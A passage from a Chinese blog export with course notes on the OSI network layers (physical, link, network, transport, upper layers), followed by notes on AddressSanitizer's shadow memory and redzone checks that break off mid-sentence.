id="协议栈的原理"><a href="#协议栈的原理" class="headerlink" title="协议栈的原理"></a>协议栈的原理</h3><p>对于多层次的协议栈，每个层次都有各自的“端点”。<br>处于【同一层次】的两个端点，使用该层次的协议进行通讯。（一个层次的协议，可能有一个有可能有多个）<br>除最顶层外，每个层次的端点向其【直接】上层提供“服务”；除最底层外，上层的端点调用【直接】下层提供的“服务”。（服务，技术行话为“API”，即接口）</p><h3 id="OSI-参考模型的7层"><a href="#OSI-参考模型的7层" class="headerlink" title="OSI 参考模型的7层"></a>OSI 参考模型的7层</h3><table><thead><tr><th>层次</th><th>中文名</th><th>英文名</th></tr></thead><tbody><tr><td>7</td><td>应用层</td><td>Application Layer</td></tr><tr><td>6</td><td>表示层</td><td>Presentation Layer</td></tr><tr><td>5</td><td>会话层</td><td>Session Layer</td></tr><tr><td>4</td><td>传输层</td><td>Transport Layer</td></tr><tr><td>3</td><td>网络层</td><td>Network Layer</td></tr><tr><td>2</td><td>数据链路层</td><td>Data Link Layer</td></tr><tr><td>1</td><td>物理层</td><td>Physical Layer</td></tr></tbody></table><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h3 id="为什么需要物理层（必要性）"><a href="#为什么需要物理层（必要性）" class="headerlink" title="为什么需要物理层（必要性）"></a>为什么需要物理层（必要性）</h3><p>物理层是物质层次上的数据传输，例如光纤中的光信号，无线电通讯等等，其依赖于物理媒介进行通讯。</p><p>物理层的主要职责是：屏蔽其他细节，除物理层之外的其他地方，无需考虑物理上的数据传输。</p><h3 id="信噪比（Signal-to-noise-ratio"><a href="#信噪比（Signal-to-noise-ratio" class="headerlink" title="信噪比（Signal-to-noise ratio)"></a>信噪比（Signal-to-noise ratio)</h3><p>噪声（Noise）：对于“物理信道”，传输过程中收到的环境干扰，产生的无用数据，称之为噪声。</p><p>而“信道传输的有用信息”与“无用的干扰噪声”之比，称之为信噪比。</p><p>信噪比的单位是【分贝】（decibel）。“deci”表示十进制，“bel”是为了纪念贝尔。</p><h3 id="多路复用（Multiplexing"><a href="#多路复用（Multiplexing" class="headerlink" title="多路复用（Multiplexing)"></a>多路复用（Multiplexing)</h3><p>对信道的复用，能提升信道传输信息的效率。</p><p><strong>频分多路复用（Frequency-Division Multiplexing，FDM)</strong></p><p>将频率拆分，不同的线路占用不同频段，互不干扰。</p><p>缺点：</p><ul><li>需要足够宽的频段（频段是稀缺资源）；</li><li>不同线路流量变化，某频段的线路若空闲，则其频段被浪费。</li></ul><p><strong>时分多路复用（Time-Divition Multiplexing，TDM）</strong></p><p>这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。</p><p>这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。</p><p>缺点：线路过多，则等待时间长。</p><p><strong>码分多路复用（Code-Divition Multiplexing，CDM）</strong></p><p>同一端点使用不同的编码策略，使发出的数据包互不干扰。</p><h3 id="物理层的协议实现"><a href="#物理层的协议实现" class="headerlink" title="物理层的协议实现"></a>物理层的协议实现</h3><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p7.png"></p><h3 id="物理层的设备"><a href="#物理层的设备" class="headerlink" title="物理层的设备"></a>物理层的设备</h3><p><strong>调制解调器（modem）</strong></p><p>用于翻译“数字信号 ＆ 模拟信号”。</p><p>在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。</p><p><strong>中继器（repeater）</strong></p><p>信号在传输过程中，能量会随着距离衰减，”中继器“则负责【信号增益】，使信号传达更远距离。</p><p><strong>集线器（hub）</strong></p><p>可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。</p><p>n in 1</p><h2 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h2><h3 id="链路层的必要性"><a href="#链路层的必要性" class="headerlink" title="链路层的必要性"></a>链路层的必要性</h3><p><strong>对信息打包</strong></p><p>链路层将物理层收到的流（一堆比特）打包，方便上层协议处理。链路层的数据称之为帧。</p><p><strong>差错控制</strong></p><p>链路层负责检查物理层的传输是否出错。</p><p><strong>流量控制</strong></p><p>防止发送方发送数据的速度大于接收方处理数据的速度。</p><p><strong>信道复用</strong></p><p>某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。</p><h3 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h3><p>为了检查传输的信息是否出错，设计了许多相应的数学算法。</p><p>检错算法：对传输数据计算出一个【校验值】，接收方收到数据会重新计算校验和，若算出来不对，则丢弃数据令其重发。</p><h3 id="MAC-协议"><a href="#MAC-协议" class="headerlink" title="MAC 协议"></a>MAC 协议</h3><p>“MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。</p><p>假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。<br>首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。<br>所有这些协调工作，都是靠“MAC 协议”来搞定。</p><h3 id="MAC-地址"><a href="#MAC-地址" class="headerlink" title="MAC 地址"></a>MAC 地址</h3><p>为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。</p><p>通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。</p><p>MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。</p><p>MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。</p><p>MAC地址构成如下图：</p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p8.png"></p><p>“虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（<code>224 = 16777216</code>），碰巧一样的概率很低。<br>　　（注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题）</p><h3 id="链路层相关的【网络设备】"><a href="#链路层相关的【网络设备】" class="headerlink" title="链路层相关的【网络设备】"></a>链路层相关的【网络设备】</h3><p><strong>网络交换机（network switch）</strong></p><p>此处引用某网络牛人的叙述，真的很幽默风趣且有道理。。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">（注：一般提到“网络交换机”，如果不加定语，指的就是“<span class="hljs-number">2</span>层交换机”；此外还有更高层的交换机，在后续章节介绍）<br>　　为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。<br>　　以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【<span class="hljs-number">1</span>层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有<span class="hljs-number">4</span>台电脑（<span class="hljs-selector-tag">A</span>、<span class="hljs-selector-tag">B</span>、C、D）都连在集线器上，<span class="hljs-selector-tag">A</span> 发数据给 <span class="hljs-selector-tag">B</span>，其实 C ＆ D 也都收到 <span class="hljs-selector-tag">A</span> 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“<span class="hljs-number">10</span>兆”，所以集线器虽然低效，还能忍受。<br>　　后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。<br>　　交换机是工作在<span class="hljs-number">2</span>层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。<br>　　由于交换机能识别<span class="hljs-number">2</span>层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。<br></code></pre></td></tr></table></figure><p>简单来说，网络交换机负责将需要传输给对应 MAC 地址的包，定向单独地，传输给指定目标。</p><p><strong>网桥/桥接器（network bridge）</strong></p><p>“交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。</p><p>例如，宿主机与虚拟机之间进行互ping，需要设置桥接模式。</p><p>现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？<br>奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。<br>这种网卡模式之所以称作“bridge 模式”，原因就在于此。</p><h3 id="链路层相关软件"><a href="#链路层相关软件" class="headerlink" title="链路层相关软件"></a>链路层相关软件</h3><p><strong>嗅探抓包工具（Sniffer）</strong></p><p>这些攻击能捕获流经你网卡的所有的【链路层】数据包。</p><p><strong>关于 ARP 协议</strong></p><p>地址解析协议（Address Resolution Protocol），其基本功能为透过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。它是IPv4中网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。</p><p>假设主机A和B在同一个<strong>网段</strong>，主机A要向主机B发送信息，主机A首先查看自己的ARP表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全为0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。</p><p><strong>总结</strong>，若 A 中无目的主机的 MAC 地址，则广播一个 ARP 请求报文，去让 B 收到该报文，并返回它自己的 MAC 地址给 A 以接收数据。</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="网络层的必要性"><a href="#网络层的必要性" class="headerlink" title="网络层的必要性"></a>网络层的必要性</h3><p><strong>路由机制（routing）</strong></p><p>由于 OSI 模型中，链路层本身【不】提供路由功能，即不是”直接“相连的主机之间，无法进行通信。</p><p>而对于复杂网络，很多端点间可能没有【直接链接】。为了在这些端点间建立链接，需要某种机制，让其他端点帮忙转发数据，这就是”路由机制”的引入。</p><p><strong>IP地址</strong></p><p>链路层提供了全球唯一的地址编码方式（MAC 地址），但 MAC 地址存在一些问题：</p><ul><li>MAC 地址是固定的；</li><li>MAC 地址基于【厂商】，无法体现【网络】的拓扑结构。对“路由机制”不友好。</li></ul><p>所以引入更抽象的地址，也就是“网络层地址”。即 IP 地址。</p><p>如果把 MAC 地址看作每个人的身份证号，在学校、公司内用身份证号来确定一个人，可以，但不方便（数据库系统课上也有相关概念，主键设计这些）。于是给每个人一个学号、员工id，由年级、院系等成分构成，对当前层次（单位）更加友好。</p><p>类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。</p><p><strong>网际互连</strong></p><p>引入网络层的另一个目的是：屏蔽不同类型的网络之间的差异，实现”Network of networks“的建立。</p><p>一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。</p><p>假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。</p><p>反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。</p><p>如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。</p><p><strong>总结下网络层的作用</strong></p><ul><li>实现路由，不直连端点间的通信；</li><li>将主机用其所处的不同的网络划分，给其分配 IP 地址；</li><li>统一协议，实现网际互连。</li></ul><h3 id="关于路由"><a href="#关于路由" class="headerlink" title="关于路由"></a>关于路由</h3><p>当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤：</p><p>1.<br>A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。<br>如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。<br>（此处所说的“网关”指“3层网关/网络层网关”）<br>2.<br>对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。<br>也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。<br>（万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错）<br>3.<br>当数据到达某个路由器之后，有如下几种可能——<br>3.1<br>该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦；<br>3.2<br>亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） …… 如此循环往复，最终到达目的地 B。<br>3.3<br>还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。<br>通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。</p><p>对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？</p><p>这时候，“路由算法”就体现出价值啦——一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。</p><p><strong>总结</strong>：路由就类似一个个寝室敲门，问老张在不在里面，一个个敲下去。。。</p><h3 id="关于电路交换与分组交换"><a href="#关于电路交换与分组交换" class="headerlink" title="关于电路交换与分组交换"></a>关于电路交换与分组交换</h3><p>电路交换：可以理解为打电话，要建立链接后，独占信道，进行通信；</p><p>分组交换：类似微信、email，是留言的形式，不建立连接，发过去就行，让数据包自己路由，在网络中跑动到目的地。</p><p>对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。</p><h3 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h3><p>“IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。</p><p>这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。</p><p>但目前 IPv4 地址正在枯竭，其最多表示【2的32次方】即42亿左右的不同地址，如今，全球网民几十亿。。。IP地址开始不够用了。</p><p>关于 IPv6 。IPv6 采用16字节的设计，可表达2的128次方，设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。</p><p>但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。</p><p><strong>网络地址转换（NAT）</strong></p><p>用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。</p><h3 id="网络层的设备"><a href="#网络层的设备" class="headerlink" title="网络层的设备"></a>网络层的设备</h3><p><strong>路由器</strong></p><p><strong>3层交换机</strong></p><p>“3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。</p><p>与路由器的差别在于：”3层交换机“链接的几个子网是【同种】的网络；而路由器可以链接【异种】网络。</p><h3 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h3><p>ping 使用 ICMP 协议测试某个远程主机是否可到达。</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="传输层的必要性"><a href="#传输层的必要性" class="headerlink" title="传输层的必要性"></a>传输层的必要性</h3><p><strong>屏蔽”有链接 or 无连接“ 的差异</strong></p><p>网络层实现了屏蔽【异种】网络的差异（如”以太网“，”ATM“，etc），但网络层有一个差异未解决：电路交换（有链接） &amp; 分组交换（无连接）。</p><p>这个差异将由传输层完成弥补。</p><p><strong>从”host“到”进程“</strong></p><p>前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。</p><p>而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。</p><h3 id="传输层的端口"><a href="#传输层的端口" class="headerlink" title="传输层的端口"></a>传输层的端口</h3><p>刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。</p><p>当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。</p><p>即某个 port。</p><h3 id="传输层的协议"><a href="#传输层的协议" class="headerlink" title="传输层的协议"></a>传输层的协议</h3><p>为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。</p><p>具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。</p><h3 id="套接字（socket-API）"><a href="#套接字（socket-API）" class="headerlink" title="套接字（socket API）"></a>套接字（socket API）</h3><p>影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。</p><p>需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。</p><h2 id="业务层（上三层：会话层，表示层，应用层）"><a href="#业务层（上三层：会话层，表示层，应用层）" class="headerlink" title="业务层（上三层：会话层，表示层，应用层）"></a>业务层（上三层：会话层，表示层，应用层）</h2><p>【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。</p><h3 id="业务层的必要性"><a href="#业务层的必要性" class="headerlink" title="业务层的必要性"></a>业务层的必要性</h3><p>业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。</p><p>问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。</p><p>再强调一下：业务层的协议如何分层，完全看具体的<strong>业务逻辑</strong>，不要生搬硬套任何现有的参考模型。</p><p><strong>总结</strong>：业务层目的是让网络软件之间能相互通信。</p><h3 id="业务层的协议"><a href="#业务层的协议" class="headerlink" title="业务层的协议"></a>业务层的协议</h3><p><strong>HTTP</strong></p><p>互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。</p><p><strong>SSL/TLS</strong></p><p>最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AddressSanitizer</title>
    <link href="/2023/03/02/AddressSanitizer/"/>
    <url>/2023/03/02/AddressSanitizer/</url>
    
    <content type="html"><![CDATA[<h1 id="AddressSanitizer论文"><a href="#AddressSanitizer论文" class="headerlink" title="AddressSanitizer论文"></a>AddressSanitizer论文</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>这个项目可以检测<code>out-of-bounds</code>及<code>use-after-free</code>导致的bug。</p><h2 id="Shadow-Memory"><a href="#Shadow-Memory" class="headerlink" title="Shadow Memory"></a>Shadow Memory</h2><p><strong>何为Shadow Memory</strong><br>引用维基百科：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">In computing, <span class="hljs-keyword">shadow </span>memory is a technique used to track <span class="hljs-keyword">and </span>store information on computer memory used <span class="hljs-keyword">by </span>a program during its execution. <span class="hljs-keyword">Shadow </span>memory consists of <span class="hljs-keyword">shadow </span><span class="hljs-keyword">bytes </span>that map to individual <span class="hljs-keyword">bits </span><span class="hljs-keyword">or </span>one <span class="hljs-keyword">or </span>more <span class="hljs-keyword">bytes </span>in main memory. These <span class="hljs-keyword">shadow </span><span class="hljs-keyword">bytes </span>are typically invisible to the <span class="hljs-keyword">original </span>program <span class="hljs-keyword">and </span>are used to record information about the <span class="hljs-keyword">original </span>piece of data. --维基百科<br></code></pre></td></tr></table></figure><p>简而言之，shadow memory 是用来记录当前进程内存的可访问状态的元数据。<br>本ASAN应用中，利用 shadow memory 的映射，知道当前内存的可访问状态。<br>例如有一块内存M1，其 shadow memory 是S1，当我们需要访问M1时，会先读取S1，若S1记录值允许访问，才可访问。不难发现，如果应用 shadow memory，则需要为其单独分配空间来储存状态量。<br><strong>更高效的映射方法</strong><br>ASAN使用了一种更高效的映射方法，可以将一块 8Byte 的内存块用 1Byte 的内存表示。<br>因为 malloc 函数返回地址（分配地址）是 8Byte 对齐的，故一块内存可以进行寻址访问的状态便有以下9种：</p><ul><li>整块内存（8Byte）均无法访问；</li><li>整块内存（8Byte）均可访问；</li><li>仅内存的前k字节可访问（k从1~7之间取值）。</li></ul><p>那么一块内存的访问状态，便可以用 1Byte 大小的空间进行表示，甚至完全不需要 1Byte。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">什么是 <span class="hljs-number">8</span><span class="hljs-keyword">Byte</span> 对齐？<br><br>当使用 malloc 函数分配空间时，比如<br><span class="hljs-keyword">void</span> *p1 = malloc(<span class="hljs-number">1</span>);<br>我申请了<span class="hljs-number">1</span>个字节大小的内存，但 malloc 函数会分配给我<span class="hljs-number">8</span>个字节的连续的一块内存。<br>这就是 <span class="hljs-number">8</span><span class="hljs-keyword">byte</span> 对齐<br><br>为什么是<span class="hljs-number">9</span>个状态？<br><br>首先，如果该内存块未被分配，即全部无法访问，对应一种；<br>如果该内存块全部被分配，则全部可以访问，对应一种；<br>由于内存块是连续分配的，故不可能出现 连续的 <span class="hljs-number">8</span><span class="hljs-keyword">Byte</span> 内，第<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span> <span class="hljs-keyword">Byte</span> 可访问，第 <span class="hljs-number">4</span> <span class="hljs-keyword">Byte</span>不可访问，而第 <span class="hljs-number">5</span> <span class="hljs-keyword">Byte</span> 又可以访问的情况，故对应了<span class="hljs-number">7</span>种情况，即该块内，前k个 <span class="hljs-keyword">Byte</span> 可访问，而后 <span class="hljs-number">8</span> - k <span class="hljs-keyword">Byte</span>无法访问。共对应 <span class="hljs-number">7</span> 种情况。<br>故一共是 <span class="hljs-number">1</span> + <span class="hljs-number">1</span> + <span class="hljs-number">7</span> = <span class="hljs-number">9</span> 种状态。<br><br></code></pre></td></tr></table></figure><p><strong>Shadow Memory 对应算法</strong><br>即如何将 Memory 的内容映射至 Shadow 呢<br>使用以下公式，其中 ADDR 表示当前内存块的地址：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">(<span class="hljs-keyword">ADDR</span> &gt;&gt; <span class="hljs-number">3</span>) + OFFSET<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>即右移三位后，统一加上一个偏移值 OFFSET 避免与正常允许的内存产生冲突。</p><p><strong>Shadow Memory 中存放的值</strong><br>规则如下：</p><ul><li>当该 Shadow Memory 值为0时，表示该内存块所有地址均可寻址；</li><li>值为1~7的整数时，表示前k个地址可寻址；</li><li>值为任意负数时，表示不可寻址；<br>且<strong>不同的负数</strong>表示不同的不可寻址：heap redzones， stack redzones, global redzones, freed redzones)</li></ul><h2 id="判断是否访问了不能访问的内存"><a href="#判断是否访问了不能访问的内存" class="headerlink" title="判断是否访问了不能访问的内存"></a>判断是否访问了不能访问的内存</h2><p>首先，当 AccessSize 也就是访问的位数等于8时</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ShadowAddr </span>= (<span class="hljs-keyword">Addr </span>&gt;&gt; <span class="hljs-number">3</span>) + Offset;<br>if(*<span class="hljs-keyword">ShadowAddr </span>!= <span class="hljs-number">0</span>)<br>   ReportAndCrash(<span class="hljs-keyword">Addr);</span><br><span class="hljs-keyword"></span>   <br></code></pre></td></tr></table></figure><p>当 AccessSize 为 1 、 2 、 4时，需要将Addr带入，与7做AND操作后，进行判断</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">ShadowAddr = (<span class="hljs-name">Addr</span> &gt;&gt; <span class="hljs-number">3</span>) + Offset<span class="hljs-comment">;</span><br>k = *ShadowAddr<span class="hljs-comment">;</span><br>if ( <span class="hljs-name">k</span> != <span class="hljs-number">0</span> <span class="hljs-symbol">&amp;&amp;</span> ((<span class="hljs-name">Addr</span> &amp; <span class="hljs-number">7</span> ) + AccessSize &gt; k))<br>     ReportAndCrash(<span class="hljs-name">Addr</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>为何此处是 <code>Addr &amp; 7 + AccessSize</code>与 k（可访问字节数）做比较呢<br>因为 Addr &amp; 7 代表被访问的该内存（这一Byte），相对其之前一个“对齐点”的位移，加上妄图访问的字节数后，就是最终访问的总字节数，用其与 k 比大小，可判断是否越界。</p><p><strong>关于代码插桩何时介入</strong><br>放到LLVM优化的靠后位置，这样只需要对被LLVM进行过优化的代码进行插桩，减少了不必要的插入。<br>该报错代码 <code>ReportAndCrash</code> 只会执行一次就中断程序。</p><p><strong>运行时</strong>：<br>调用 malloc 函数会返回一段内存，和两端额外的内存，延申在原本申请的内存两端，这被称为<code> redzone</code>或称为 <code>poisoned</code>，分配的 <code> red zone</code> 越大，找到溢出漏洞的概率越大。<br>设置redzone将分配的内存段包住，有以下关系：<br>当分配的内存段数量为 n 时， redzones 的数量应该是 n+1 </p><p>free 函数会将释放区域全部设置为 poisoned 且不会恢复，即该区域暂时不会再次被 malloc。这被叫做拖入隔离区，隔离区是一个大小固定的 FIFO 队列。默认情况下，malloc和free会记录当前的调用栈以为bug报告提供更多信息</p><p><strong>栈及全局对象的检测</strong></p><p>对于全局对象，redzones 是在编译时被放入的，随后在程序运行时，这些地址被传入<code> runtime library</code>。程序运行时，这些 redzones 会被 标记为 